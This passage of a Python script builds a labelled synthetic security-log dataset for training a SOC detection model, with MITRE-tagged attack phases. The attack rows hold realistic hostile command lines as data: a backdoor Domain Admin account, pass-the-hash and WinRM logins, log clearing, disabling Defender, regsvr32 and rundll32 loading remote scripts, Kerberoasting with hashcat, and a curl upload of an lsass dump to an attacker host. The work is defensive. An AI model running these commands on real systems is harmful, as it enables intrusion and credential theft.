     "C:\\Windows\\System32\\net.exe", "C:\\Windows\\System32\\cmd.exe",
     "net group 'Domain Admins' backdoor /add /domain",
     "windows_sysmon", "1",
     "Persistence", "T1098", "",
     "net group 'Domain Admins' backdoor /add: backdoor added to DA group"),

    ("SOC-DC", "Administrator",
     "", "",
     "",
     "windows_security", "4720",
     "Persistence", "T1136", "T1136.002",
     "EventID 4720: User account backdoor created by Administrator"),

    ("SOC-DC", "Administrator",
     "", "",
     "",
     "windows_security", "4728",
     "Persistence", "T1098", "",
     "EventID 4728: Member backdoor added to Domain Admins by Administrator"),

    ("SOC-CLIENT02", "Administrator",
     "C:\\Windows\\System32\\sc.exe", "C:\\Windows\\System32\\cmd.exe",
     "sc create WinMgmtSvc binPath= C:\\Windows\\Temp\\svc1.exe start= auto",
     "windows_sysmon", "1",
     "Persistence", "T1543", "T1543.003",
     "sc create: WinMgmtSvc service created pointing to svc1.exe (service persistence)"),
]

for victim, user, proc, parent, cmdline, source, ecode, tactic, tech, sub, desc in PERSIST_EVENTS:
    victim_ip = HOSTS[victim]
    rows.append(mkrow(
        t, victim, source, ecode, "process_creation" if ecode == "1" else "registry_event",
        "persistence_activity",
        user, DOMAIN, proc, parent, cmdline,
        victim_ip, "", "", "",
        "persistence", 1, "ATTACK_PERSIST",
        tactic, tech, sub, 0.98,
        f"ATTACK_PERSIST|{user}|{victim}", f"Sysmon/Security EventID {ecode}", desc
    ))
    t += R(5, 20)

# ============================================================
# PHASE 9: LATERAL MOVEMENT
# ============================================================
print("Phase 9: Lateral movement...")

t = 95000

LATERAL_EVENTS = [
    # PsExec CLIENT01 → CLIENT02
    ("SOC-CLIENT01", "SOC-CLIENT02", "Administrator", "445", "T1021", "T1021.002",
     "psexec \\\\192.168.56.30 -u Administrator -p Attack001@123 cmd.exe",
     "PsExec: CLIENT01 → CLIENT02 admin share"),
    # WinRM
    ("soc-kali",     "SOC-CLIENT01", "Administrator", "5985", "T1021", "T1021.006",
     "evil-winrm -i 192.168.56.20 -u Administrator -p Attack001@123",
     "evil-winrm WinRM: kali → SOC-CLIENT01:5985"),
    # SMB pass-the-hash
    ("soc-kali",     "SOC-DC",       "Administrator", "445",  "T1550", "T1550.002",
     "crackmapexec smb 192.168.56.10 -u Administrator -H <NTLM_HASH> --exec-method smbexec",
     "Pass-the-Hash: crackmapexec SMB to SOC-DC"),
    # RDP
    ("SOC-CLIENT01", "SOC-CLIENT02", "user2",         "3389", "T1021", "T1021.001",
     "mstsc /v:192.168.56.30",
     "RDP: SOC-CLIENT01 → SOC-CLIENT02:3389"),
    # SSH
    ("soc-kali",     "SOC-CLIENT01", "Administrator", "22",   "T1021", "T1021.004",
     "ssh Administrator@192.168.56.20",
     "SSH: kali → SOC-CLIENT01:22"),
]

for src_host, dst_host, user, port, tech, sub, cmd, desc in LATERAL_EVENTS:
    src_ip = HOSTS[src_host]
    dst_ip = HOSTS[dst_host]
    rows.append(mkrow(
        t, src_host, "linux_auditd" if src_host == "soc-kali" else "windows_sysmon",
        "1", "process_creation", "process_execution",
        user, DOMAIN,
        cmd.split()[0], "/bin/bash" if src_host == "soc-kali" else "C:\\Windows\\System32\\cmd.exe",
        cmd, src_ip, str(R(49152, 65535)), dst_ip, port,
        "lateral_movement", 1, "ATTACK_LATERAL",
        "Lateral Movement", tech, sub, 0.98,
        f"ATTACK_LATERAL|{user}|{src_host}", "Sysmon/auditd", desc
    ))
    t += 3
    # Logon event on destination
    rows.append(mkrow(
        t, dst_host, "windows_security", "4624", "logon", "authentication",
        user, DOMAIN, "", "", "",
        src_ip, "", dst_ip, port,
        "lateral_logon", 1, "ATTACK_LATERAL",
        "Lateral Movement", tech, sub, 0.96,
        f"ATTACK_LATERAL|{user}|{dst_host}", "Windows Security EventID 4624",
        f"EventID 4624: {user} from {src_ip} LogonType=3 (lateral movement to {dst_host})"
    ))
    t += R(10, 40)

# ============================================================
# PHASE 10: DEFENSE EVASION
# ============================================================
print("Phase 10: Defense evasion...")

t = 100000

EVASION_EVENTS = [
    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "C:\\Windows\\System32\\cmd.exe",
     "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true",
     "Defense Evasion", "T1562", "T1562.001",
     "Disable Windows Defender real-time monitoring"),

    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\wevtutil.exe",
     "C:\\Windows\\System32\\cmd.exe",
     "wevtutil cl Security",
     "Defense Evasion", "T1070", "T1070.001",
     "wevtutil cl Security: Security log cleared"),

    ("SOC-CLIENT01", "Administrator", "windows_security", "1102",
     "", "", "",
     "Defense Evasion", "T1070", "T1070.001",
     "EventID 1102: Security audit log was cleared"),

    ("SOC-CLIENT02", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\wevtutil.exe",
     "C:\\Windows\\System32\\cmd.exe",
     "wevtutil cl System && wevtutil cl Application && wevtutil cl Security",
     "Defense Evasion", "T1070", "T1070.001",
     "wevtutil: All event logs cleared on SOC-CLIENT02"),

    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "C:\\Windows\\System32\\cmd.exe",
     "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQA",
     "Defense Evasion", "T1027", "",
     "Obfuscated PowerShell: base64-encoded payload execution"),

    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\regsvr32.exe",
     "C:\\Windows\\System32\\cmd.exe",
     "regsvr32 /s /n /u /i:http://192.168.56.40/payload.sct scrobj.dll",
     "Defense Evasion", "T1218", "T1218.010",
     "Regsvr32 squiblydoo: load remote SCT via scrobj.dll"),

    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\rundll32.exe",
     "C:\\Windows\\System32\\cmd.exe",
     "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication\";document.write();GetObject('script:http://192.168.56.40/shell.sct')",
     "Defense Evasion", "T1218", "T1218.011",
     "Rundll32 LOLBin: load remote script via mshtml"),

    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\cmd.exe",
     "C:\\Windows\\Temp\\svc0.exe",
     "attrib +h +s C:\\Windows\\Temp\\svc0.exe",
     "Defense Evasion", "T1564", "T1564.001",
     "attrib +h +s: payload hidden with system+hidden attributes"),

    ("SOC-CLIENT01", "Administrator", "windows_sysmon", "1",
     "C:\\Windows\\System32\\cmd.exe",
     "C:\\Windows\\Temp\\svc0.exe",
     "timestomp C:\\Windows\\Temp\\svc0.exe -f C:\\Windows\\System32\\notepad.exe",
     "Defense Evasion", "T1070", "T1070.006",
     "timestomp: payload timestamps forged to match notepad.exe"),
]

for victim, user, source, ecode, proc, parent, cmdline, tactic, tech, sub, desc in EVASION_EVENTS:
    victim_ip = HOSTS[victim]
    rows.append(mkrow(
        t, victim, source, ecode, "process_creation", "defense_evasion",
        user, DOMAIN, proc, parent, cmdline,
        victim_ip, "", "", "",
        "defense_evasion", 1, "ATTACK_EVASION",
        tactic, tech, sub, 0.97,
        f"ATTACK_EVASION|{user}|{victim}", f"{source} EventID {ecode}", desc
    ))
    t += R(5, 20)

# ============================================================
# PHASE 11: KERBEROASTING
# ============================================================
print("Phase 11: Kerberoasting...")

t = 105000

KERB_ACCOUNTS = ["svc_sql", "svc_backup", "svc_web", "svc_admin"]

for svc_acc in KERB_ACCOUNTS:
    rows.append(mkrow(
        t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
        "root", "", "python3", "/bin/bash",
        f"python3 GetUserSPNs.py socfusion.local/svc_sql:Attack003@123 -dc-ip 192.168.56.10 -request -outputfile {svc_acc}.hash",
        "192.168.56.40", str(R(40000, 60000)), "192.168.56.10", "88",
        "kerberoasting_exec", 1, "ATTACK_KERB",
        "Credential Access", "T1558", "T1558.003", 0.99,
        f"ATTACK_KERB|root|soc-kali", "Kali auditd",
        f"GetUserSPNs.py: TGS request for {svc_acc}@SOCFUSION.LOCAL"
    ))
    t += 2

    # DC logs EventID 4769
    rows.append(mkrow(
        t, "SOC-DC", "windows_security", "4769", "kerberos_ticket", "authentication",
        f"{svc_acc}@SOCFUSION.LOCAL", DOMAIN, "", "", "",
        "192.168.56.40", str(R(40000, 60000)), "192.168.56.10", "88",
        "kerberoasting_dc_log", 1, "ATTACK_KERB",
        "Credential Access", "T1558", "T1558.003", 0.99,
        f"ATTACK_KERB|{svc_acc}|SOC-DC", "Windows Security EventID 4769",
        f"EventID 4769: TGS requested for {svc_acc}, EncType=0x17 (RC4-HMAC - crackable)"
    ))
    t += 2

    # Offline crack
    rows.append(mkrow(
        t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
        "root", "", "hashcat", "/bin/bash",
        f"hashcat -m 13100 -a 0 {svc_acc}.hash /usr/share/wordlists/rockyou.txt --force",
        "192.168.56.40", "", "", "",
        "kerberoasting_crack", 1, "ATTACK_KERB",
        "Credential Access", "T1558", "T1558.003", 0.98,
        f"ATTACK_KERB|root|soc-kali", "Kali auditd",
        f"hashcat: cracking Kerberos RC4 ticket for {svc_acc}"
    ))
    t += R(20, 60)

# Also try AS-REP roasting
rows.append(mkrow(
    t, "soc-kali", "linux_auditd", "", "EXECVE", "process_execution",
    "root", "", "python3", "/bin/bash",
    "python3 GetNPUsers.py socfusion.local/ -usersfile users.txt -dc-ip 192.168.56.10 -no-pass -format hashcat",
    "192.168.56.40", "", "192.168.56.10", "88",
    "asrep_roasting", 1, "ATTACK_KERB",
    "Credential Access", "T1558", "T1558.004", 0.97,
    "ATTACK_KERB|root|soc-kali", "Kali auditd",
    "GetNPUsers.py: AS-REP roasting accounts without Kerberos pre-auth"
))
t += 10

# ============================================================
# PHASE 12: EXFILTRATION
# ============================================================
print("Phase 12: Exfiltration...")

t = 112000

EXFIL_EVENTS = [
    ("SOC-CLIENT01", "Administrator", "192.168.56.40", "4444", "T1041", "",
     "Meterpreter: download C:\\Users\\Administrator\\Documents\\passwords.txt"),
    ("SOC-CLIENT01", "Administrator", "192.168.56.40", "80",   "T1048", "T1048.003",
     "curl http://192.168.56.40/upload -F file=@C:\\Windows\\Temp\\lsass.dmp"),
    ("SOC-CLIENT01", "Administrator", "192.168.56.40", "53",   "T1048", "T1048.001",
     "DNS exfiltration: base64-encoded data via TXT record queries to 192.168.56.40"),
    ("SOC-CLIENT02", "Administrator", "192.168.56.40", "443",  "T1041", "",
     "HTTPS C2 exfil: sensitive docs staged and sent via meterpreter session"),
]

for victim, user, dst_ip, dst_port, tech, sub, desc in EXFIL_EVENTS:
    victim_ip = HOSTS[victim]
    rows.append(mkrow(
        t, victim, "windows_sysmon", "3", "network_connection", "network_activity",
        user, DOMAIN,
        f"C:\\Windows\\Temp\\svc0.exe", "", "",
        victim_ip, str(R(49152, 65535)), dst_ip, dst_port,
        "exfiltration", 1, "ATTACK_EXFIL",
        "Exfiltration", tech, sub, 0.97,
        f"ATTACK_EXFIL|{user}|{victim}", "Sysmon EventID 3", desc
    ))
    t += R(5, 20)

# ============================================================
# PHASE 13: POST-ATTACK BASELINE (2000 more benign events)
# ============================================================
print("Phase 13: Post-attack baseline...")

t = 120000
for _ in range(2000):
    rows.append(benign(t))
    t += R(5, 80)

# ============================================================
# WRITE OUTPUT
# ============================================================
output_path = "/home/vikas/SOCFusion/SOCFusion_FULL_TRAINING_DATASET_v2.csv"

print(f"\nWriting {len(rows)} rows to {output_path}...")

with open(output_path, "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=COLUMNS)
    writer.writeheader()
    writer.writerows(rows)

# Stats
attack_rows = [r for r in rows if r["attack_label"] == 1]
benign_rows  = [r for r in rows if r["attack_label"] == 0]

attack_ids   = {}
techniques   = {}
for r in attack_rows:
    aid = r["attack_id"]
    attack_ids[aid] = attack_ids.get(aid, 0) + 1
    t_key = r["mitre_subtechnique"] if r["mitre_subtechnique"] else r["mitre_technique"]
    if t_key:
        techniques[t_key] = techniques.get(t_key, 0) + 1

print(f"\n✅ Dataset generated!")
print(f"   Total rows  : {len(rows)}")
print(f"   Attack rows : {len(attack_rows)}")
print(f"   Benign rows : {len(benign_rows)}")
print(f"   Ratio (B:A) : {len(benign_rows)/max(len(attack_rows),1):.1f}:1")
print(f"\nAttack ID breakdown:")
for aid, cnt in sorted(attack_ids.items()):
    print(f"   {aid:<35} {cnt} events")
print(f"\nMITRE technique coverage ({len(techniques)} unique):")
for tech, cnt in sorted(techniques.items()):
    print(f"   {tech:<20} {cnt} events")
print(f"\nOutput: {output_path}")
